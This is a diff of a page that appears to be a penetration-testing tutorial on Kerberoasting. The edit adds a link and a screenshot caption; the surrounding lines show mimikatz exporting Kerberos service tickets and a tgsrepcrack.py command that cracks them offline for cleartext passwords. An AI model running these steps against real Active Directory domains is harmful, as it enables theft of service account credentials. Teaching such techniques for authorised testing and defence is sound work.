@@ -24,10 +24,12 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 mimikatz # kerberos::list /export
 ~~~
 
-<p>The kirbi file can now be taken offline and cracked to reveal the clear text password. The <https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py> Python script and a wordlist can be used to crack the clear text password. Below is the required syntax:</p>
+<p>The kirbi file can now be taken offline and cracked to reveal the clear text password. The <a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" title="tgsrepcrack.py">tgsrepcrack Python script</a> and a wordlist can be used to crack the clear text password. Below is the required syntax:</p>
 
 ~~~bash
 python3 tgsrepcrack.py dictionaryfile .kirbifile
 ~~~
+
+<p>The following screenshot shows a service ticket being successfully cracked to reveal the clear text password</p>
 
 ![crackedspnexample](/assets/crackspn.png)
